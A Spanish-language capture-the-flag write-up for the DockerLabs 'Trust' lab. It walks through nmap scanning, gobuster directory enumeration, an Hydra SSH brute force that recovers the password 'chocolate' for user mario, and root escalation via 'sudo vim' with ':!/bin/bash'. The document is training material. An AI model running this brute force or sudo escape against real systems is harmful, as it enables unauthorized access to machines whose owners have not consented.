# DockerLabs — Trust

![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-21262d?style=flat)
![Dificultad](https://img.shields.io/badge/Dificultad-Very%20Easy-238636?style=flat)
![SO](https://img.shields.io/badge/SO-Linux-21262d?style=flat&logo=linux&logoColor=FCC624)
![Estado](https://img.shields.io/badge/Estado-Completada-238636?style=flat)

---

## Resumen

Laboratorio para practicar enumeración web, fuerza bruta SSH con Hydra y escalada de privilegios abusando de sudoers.

---

## Reconocimiento

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
nmap -sCV -p22,80 172.17.0.2
```

![Pasted image 20260814025509](../images/Pasted%20image%2020260814025509.png)

Vemos que están activos 2 servicios, SSH y un servidor Web, el servidor web es un Apache2 Debian Default Page sin nada interesante.

---

## Enumeración

Empecé usando este comando de gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

pero me daba un error, ya que el server devolvía un status code de 200 para páginas que no existían, así que tuve que cambiar un poco el enfoque.

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
--exclude-length 10701
```

Con el exclude-length evitamos los falsos positivos, esto lo hemos sacado viendo que si hacemos un `wc -c` después de hacer un `curl -s` a la página web.

Aún así no no pude encontrar mucho, así que decidí probar buscando extensiones con este comando:

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
-x php,html,txt,bak,old,conf \
--exclude-length 10701
```

Y me encontró un /secret.php, donde encontramos un cartel diciendo Hola Mario, nombre que podemos usar para un ataque de fuerza bruta al SSH.

![Pasted image 20260814025431](../images/Pasted%20image%2020260814025431.png)

---

## Acceso inicial (Foothold)

Pruebo un ataque de fuerza bruta con el user mario usando rockyou e **Hydra**:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

Y nos encontramos una contraseña, **chocolate**

![Pasted image 20260814025648](../images/Pasted%20image%2020260814025648.png)

Con esto iniciamos sesión en la máquina víctima con las credenciales encontradas.

![Pasted image 20260814025743](../images/Pasted%20image%2020260814025743.png)

---

## Escalada de Privilegios

```bash
id
groups
sudo -l
```

Hacemos un **sudo -l** y vemos que no somos root, pero que podemos ejecutar como root el binario *vim* 

![Pasted image 20260813181047](../images/Pasted%20image%2020260813181047.png)

Entonces simplemente hacemos sudo vim, escribimos :!/bin/bash, le damos a enter y ya tenemos una shell con root.

![Pasted image 20260814025924](../images/Pasted%20image%2020260814025924.png)
